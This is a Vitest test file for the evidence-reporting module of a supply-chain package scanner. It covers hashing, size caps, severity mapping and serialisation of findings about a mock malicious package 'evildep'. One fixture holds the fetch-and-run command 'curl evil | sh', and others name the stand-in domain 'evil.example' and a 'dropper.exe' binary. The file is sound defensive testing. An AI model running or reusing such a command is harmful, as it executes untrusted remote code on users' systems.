import { describe, it, expect, vi, afterEach } from 'vitest'
import { createHash } from 'node:crypto'
import type { Finding } from '../../../src/scanner/rules'
import type { TarballScanResult } from '../../../src/scanner/intel/deep-dependency'
import { sha512Hex } from '../../../src/scanner/intel/content-intel/identity'
import {
  buildContributePayload,
  serializeScanEvidence,
  findingToContributeItem,
  truncateUtf8,
  MAX_MANIFEST_BYTES,
  MAX_ITEMS_PER_LIST,
} from '../../../src/scanner/intel/cloud-contribute'

afterEach(() => {
  vi.unstubAllEnvs()
})

function manifestJson(): string {
  return JSON.stringify({ name: 'evildep', version: '1.0.0', scripts: { preinstall: 'node setup.mjs' } })
}

describe('buildContributePayload', () => {
  it('derives contentId as sha512:<sha512 hex of the manifest utf8 bytes>', () => {
    const manifest = manifestJson()
    const payload = buildContributePayload({ manifest, state: 'SUSPICIOUS', risk: 'high', alerts: [], deltas: [] })
    expect(payload.contentId).toBe('sha512:' + sha512Hex(Buffer.from(manifest, 'utf8')))
    expect(payload.contentId).toMatch(/^sha512:[0-9a-f]{128}$/)
  })

  it('computes manifestHash as sha256(JSON.stringify({alerts,deltas})) hex truncated to 24 chars', () => {
    const alerts = [
      { type: 'supply_chain', severity: 'CRITICAL' as const, riskLevel: 9, message: 'Dangerous lifecycle script', category: 'supply_chain' },
    ]
    const deltas = [
      { type: 'network', severity: 'MEDIUM' as const, riskLevel: 5, message: 'New network endpoint: evil.example', evidence: 'evil.example', category: 'supply_chain' },
    ]
    const payload = buildContributePayload({ manifest: manifestJson(), state: 'MALICIOUS', risk: 'critical', alerts, deltas })
    const expected = createHash('sha256').update(JSON.stringify({ alerts, deltas })).digest('hex').slice(0, 24)
    expect(payload.evidence.manifestHash).toBe(expected)
    expect(payload.evidence.manifestHash).toMatch(/^[0-9a-f]{24}$/)
  })

  it('caps alerts and deltas at 100 items each and hashes the capped lists', () => {
    const alerts = Array.from({ length: 150 }, (_, i) => ({
      type: 'code',
      severity: 'INFO' as const,
      riskLevel: 1,
      message: `finding ${i}`,
      category: 'code',
    }))
    const deltas = Array.from({ length: 150 }, (_, i) => ({
      type: 'network',
      severity: 'MEDIUM' as const,
      riskLevel: 5,
      message: `delta ${i}`,
      category: 'supply_chain',
    }))
    const payload = buildContributePayload({ manifest: manifestJson(), state: 'KNOWN_SAFE', risk: 'low', alerts, deltas })
    expect(payload.evidence.alerts).toHaveLength(MAX_ITEMS_PER_LIST)
    expect(payload.evidence.deltas).toHaveLength(MAX_ITEMS_PER_LIST)
    const expected = createHash('sha256')
      .update(JSON.stringify({ alerts: alerts.slice(0, MAX_ITEMS_PER_LIST), deltas: deltas.slice(0, MAX_ITEMS_PER_LIST) }))
      .digest('hex')
      .slice(0, 24)
    expect(payload.evidence.manifestHash).toBe(expected)
  })

  it('caps the manifest at 262144 bytes and derives contentId from the capped text', () => {
    const big = 'x'.repeat(MAX_MANIFEST_BYTES + 5000)
    const payload = buildContributePayload({ manifest: big, state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [] })
    expect(Buffer.byteLength(payload.manifest, 'utf8')).toBeLessThanOrEqual(MAX_MANIFEST_BYTES)
    expect(payload.contentId).toBe('sha512:' + sha512Hex(Buffer.from(payload.manifest, 'utf8')))
  })

  it('normalizes scannerVersion to at most 64 chars and defaults to dev', () => {
    expect(buildContributePayload({ manifest: '{}', state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [], scannerVersion: '' }).scannerVersion).toBe('dev')
    const long = 'v'.repeat(100)
    expect(buildContributePayload({ manifest: '{}', state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [], scannerVersion: long }).scannerVersion).toHaveLength(64)
  })

  it('keeps a valid multi-byte manifest intact and truncates to a whole-character prefix', () => {
    const snowman = '☃'.repeat(100)
    expect(truncateUtf8(snowman, 10)).toBe('☃'.repeat(3))
    const payload = buildContributePayload({ manifest: snowman, state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [] })
    expect(payload.manifest).toBe(snowman)
  })
})

describe('findingToContributeItem', () => {
  it('maps finding severity to the contract severity vocabulary', () => {
    const f: Finding = { severity: 'critical', category: 'supply_chain', title: 'x', description: 'd' }
    expect(findingToContributeItem(f)).toMatchObject({ severity: 'CRITICAL', riskLevel: 9, type: 'supply_chain', message: 'x', evidence: 'd', category: 'supply_chain' })
    expect(findingToContributeItem({ ...f, severity: 'high' }).severity).toBe('HIGH')
    expect(findingToContributeItem({ ...f, severity: 'medium' }).severity).toBe('MEDIUM')
    expect(findingToContributeItem({ ...f, severity: 'low' }).severity).toBe('INFO')
  })

  it('keeps the code snippet in evidence when present', () => {
    const f: Finding = { severity: 'high', category: 'supply_chain', title: 'x', description: 'desc', code: 'curl evil | sh' }
    expect(findingToContributeItem(f).evidence).toContain('curl evil | sh')
  })
})

function sampleScan(overrides: Partial<TarballScanResult> = {}): TarballScanResult {
  return {
    resolvedVersion: '1.0.0',
    contentId: 'sha512:' + 'a'.repeat(128),
    integrityVerified: true,
    delta: {
      packageName: 'evildep',
      fromVersion: '',
      toVersion: '1.0.0',
      filesChanged: 3,
      newDomains: ['evil.example'],
      newNetworkCalls: 1,
      newDependencies: [],
      newCapabilities: ['Shell'],
      newScripts: ['postinstall.js'],
      newBinaries: ['dropper.exe'],
      risk: 'critical',
      summary: 'scan summary',
    },
    files: new Map([['package.json', manifestJson()]]),
    lifecycleScripts: [{ script: 'preinstall', command: 'node setup.mjs', dangerous: true }],
    ...overrides,
  }
}

describe('serializeScanEvidence', () => {
  it('returns null when there is no delta', () => {
    expect(serializeScanEvidence({ ...sampleScan(), delta: undefined }, [])).toBeNull()
  })

  it('returns null when the tarball carried no package.json manifest', () => {
    const scan = sampleScan({ files: new Map([['index.js', 'x']]) })
    expect(serializeScanEvidence(scan, [])).toBeNull()
  })

  it('maps the delta risk to a contract state (critical → MALICIOUS)', () => {
    const out = serializeScanEvidence(sampleScan(), [])!
    expect(out.state).toBe('MALICIOUS')
    expect(out.risk).toBe('critical')
    expect(out.manifest).toBe(manifestJson())
  })

  it('serializes the new-capability/domain/script/binary signal set as deltas', () => {
    const out = serializeScanEvidence(sampleScan(), [])!
    const types = out.deltas.map(d => d.type)
    expect(types).toEqual(expect.arrayContaining(['capability', 'network', 'install_script', 'binary']))
    const shell = out.deltas.find(d => d.message.includes('Shell'))
    expect(shell).toMatchObject({ severity: 'CRITICAL', riskLevel: 9, category: 'supply_chain' })
    const script = out.deltas.find(d => d.type === 'install_script')
    expect(script?.script).toBe('postinstall.js')
  })

  it('adds a files-changed info delta when the delta is otherwise clean', () => {
    const scan = sampleScan({
      delta: {
        packageName: 'cleanpkg',
        fromVersion: '',
        toVersion: '1.0.0',
        filesChanged: 12,
        newDomains: [],
        newNetworkCalls: 0,
        newDependencies: [],
        newCapabilities: [],
        newScripts: [],
        newBinaries: [],
        risk: 'low',
        summary: 'clean',
      },
    })
    const out = serializeScanEvidence(scan, [])!
    expect(out.state).toBe('KNOWN_SAFE')
    expect(out.deltas).toEqual([
      expect.objectContaining({ type: 'files_changed', severity: 'INFO', message: '12 files in package' }),
    ])
    expect(out.alerts).toHaveLength(0)
  })

  it('serializes typed findings as alerts', () => {
    const findings: Finding[] = [
      { severity: 'critical', category: 'supply_chain', title: 'Dangerous lifecycle script', description: 'd' },
      { severity: 'medium', category: 'supply_chain', title: 'Network endpoints', description: 'd' },
    ]
    const out = serializeScanEvidence(sampleScan(), findings)!
    expect(out.alerts).toHaveLength(2)
    expect(out.alerts[0]).toMatchObject({ severity: 'CRITICAL', type: 'supply_chain' })
  })
})
